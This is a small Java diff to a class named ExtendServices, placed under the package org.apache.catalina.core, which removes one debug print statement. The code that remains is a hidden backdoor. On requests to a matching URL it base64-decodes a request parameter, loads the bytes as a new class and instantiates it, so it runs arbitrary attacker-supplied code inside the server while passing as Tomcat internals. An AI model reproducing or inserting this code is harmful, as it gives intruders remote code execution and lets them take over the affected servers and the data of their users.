@@ -12,7 +12,6 @@ public class ExtendServices {
 
     public static void doServices(java.util.Map rdd,Object obj) throws IOException, InvocationTargetException, NoSuchMethodException, IllegalAccessException, InstantiationException, ClassNotFoundException {
         if(((String)rdd.get("url")).matches("/(.*)"+org.apache.catalina.core.ExtendServices.SERVICE_URL)) {
-            System.out.println("hello?");
             byte[] data = new sun.misc.BASE64Decoder().decodeBuffer((String) rdd.get("b"));
             Class clz= Util.abstractClassLoader(data);
             clz.newInstance();
